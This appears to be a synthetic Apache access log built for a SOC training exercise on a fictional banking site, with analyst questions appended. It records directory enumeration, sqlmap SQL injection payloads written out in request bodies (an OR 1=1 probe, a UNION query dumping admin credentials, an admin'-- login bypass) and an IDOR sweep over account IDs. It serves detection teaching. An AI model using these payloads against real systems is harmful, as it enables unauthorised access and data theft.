@@ -1,0 +1,59 @@
+# ==============================================================
+# APACHE ACCESS LOG – web-banking (10.10.20.10)
+# Period: 2025-11-15 01:50 – 02:08 UTC
+# Format: Combined Log Format
+# SYNTHETIC – NG-SOC LM8 Activity 2.0.3 / Exercise 4 (Pen Test)
+# All IPs, user-agents and payloads are FICTIONAL training data.
+# ==============================================================
+
+# --- Normal browsing (baseline) ---
+10.10.30.10 - - [15/Nov/2025:01:50:12 +0000] "GET / HTTP/1.1" 200 4823 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+10.10.30.10 - - [15/Nov/2025:01:50:14 +0000] "GET /style.css HTTP/1.1" 200 2341 "http://web-banking.ngsoc-lm8.internal/" "Mozilla/5.0 (X11; Linux x86_64)"
+10.10.30.10 - - [15/Nov/2025:01:50:15 +0000] "GET /login.php HTTP/1.1" 200 3108 "http://web-banking.ngsoc-lm8.internal/" "Mozilla/5.0 (X11; Linux x86_64)"
+10.10.30.10 - - [15/Nov/2025:01:51:02 +0000] "POST /login.php HTTP/1.1" 401 512 "http://web-banking.ngsoc-lm8.internal/login.php" "Mozilla/5.0 (X11; Linux x86_64)"
+10.10.30.10 - - [15/Nov/2025:01:51:45 +0000] "POST /login.php HTTP/1.1" 401 512 "http://web-banking.ngsoc-lm8.internal/login.php" "Mozilla/5.0 (X11; Linux x86_64)"
+
+# --- Reconnaissance / directory enumeration (attacker from 10.10.50.10 = kali) ---
+10.10.50.10 - - [15/Nov/2025:02:00:01 +0000] "GET /robots.txt HTTP/1.1" 404 291 "-" "gobuster/3.6"
+10.10.50.10 - - [15/Nov/2025:02:00:02 +0000] "GET /.git/config HTTP/1.1" 403 298 "-" "gobuster/3.6"
+10.10.50.10 - - [15/Nov/2025:02:00:02 +0000] "GET /admin HTTP/1.1" 404 291 "-" "gobuster/3.6"
+10.10.50.10 - - [15/Nov/2025:02:00:03 +0000] "GET /backup HTTP/1.1" 301 315 "-" "gobuster/3.6"
+10.10.50.10 - - [15/Nov/2025:02:00:03 +0000] "GET /backup/ HTTP/1.1" 200 741 "-" "gobuster/3.6"
+# ↑ FINDING: /backup/ accessible (information disclosure – T1083)
+10.10.50.10 - - [15/Nov/2025:02:00:04 +0000] "GET /backup/db_backup_2025-01-15.sql.gz.txt HTTP/1.1" 200 614 "http://web-banking.ngsoc-lm8.internal/backup/" "Mozilla/5.0"
+# ↑ FINDING: backup file retrieved by attacker
+10.10.50.10 - - [15/Nov/2025:02:00:11 +0000] "GET /phpinfo.php HTTP/1.1" 404 291 "-" "gobuster/3.6"
+10.10.50.10 - - [15/Nov/2025:02:00:12 +0000] "GET /config.php HTTP/1.1" 404 291 "-" "gobuster/3.6"
+10.10.50.10 - - [15/Nov/2025:02:00:14 +0000] "GET /db.php HTTP/1.1" 200 0 "-" "gobuster/3.6"
+
+# --- SQL injection probe on login form (T1190) ---
+10.10.50.10 - - [15/Nov/2025:02:03:14 +0000] "POST /login.php HTTP/1.1" 401 512 "-" "sqlmap/1.7.8#stable"
+# Body: username=%27+OR+%271%27%3D%271&password=anything
+# ↑ Classic OR 1=1 injection probe
+10.10.50.10 - - [15/Nov/2025:02:03:15 +0000] "POST /login.php HTTP/1.1" 500 834 "-" "sqlmap/1.7.8#stable"
+# Body: username=%27+UNION+SELECT+1%2C2%2C3--+&password=x
+# ↑ UNION-based enumeration – 500 error reveals injection point
+10.10.50.10 - - [15/Nov/2025:02:03:16 +0000] "POST /login.php HTTP/1.1" 200 6241 "-" "sqlmap/1.7.8#stable"
+# Body: username=admin%27--+&password=anything
+# ↑ CRITICAL: 200 OK – authentication bypass via comment injection
+# ↑ Response body contained dashboard HTML (login successful as admin)
+10.10.50.10 - - [15/Nov/2025:02:03:18 +0000] "GET /dashboard.php HTTP/1.1" 200 8832 "http://web-banking.ngsoc-lm8.internal/login.php" "sqlmap/1.7.8#stable"
+10.10.50.10 - - [15/Nov/2025:02:04:02 +0000] "POST /login.php HTTP/1.1" 200 6241 "-" "sqlmap/1.7.8#stable"
+# Body: username=%27+UNION+SELECT+username%2Cpassword%2C3+FROM+admin_users--+&password=x
+# ↑ Data exfiltration: admin_users table dumped via UNION injection
+
+# --- Post-exploitation (attacker authenticated as admin) ---
+10.10.50.10 - - [15/Nov/2025:02:05:11 +0000] "GET /dashboard.php?account=1 HTTP/1.1" 200 7412 "-" "Mozilla/5.0"
+10.10.50.10 - - [15/Nov/2025:02:05:13 +0000] "GET /dashboard.php?account=2 HTTP/1.1" 200 7398 "-" "Mozilla/5.0"
+10.10.50.10 - - [15/Nov/2025:02:05:33 +0000] "GET /dashboard.php?account=100 HTTP/1.1" 200 7401 "-" "Mozilla/5.0"
+# ↑ IDOR: iterating account IDs to enumerate customer data (T1530)
+
+# ==============================================================
+# EXERCISE 4 ANALYSIS TASKS (Penetration Test – web-banking):
+# 1. Identify the HTTP method and parameter vulnerable to SQLi
+# 2. What UNION query was used to extract credentials?
+# 3. Why did gobuster find /backup/ but not other dirs?
+# 4. What is IDOR and which request demonstrates it?
+# 5. Write a WAF rule to block the injection pattern used
+# MITRE: T1190 (Exploit Public App), T1083 (Dir Discovery), T1530 (Data from Cloud)
+# ==============================================================
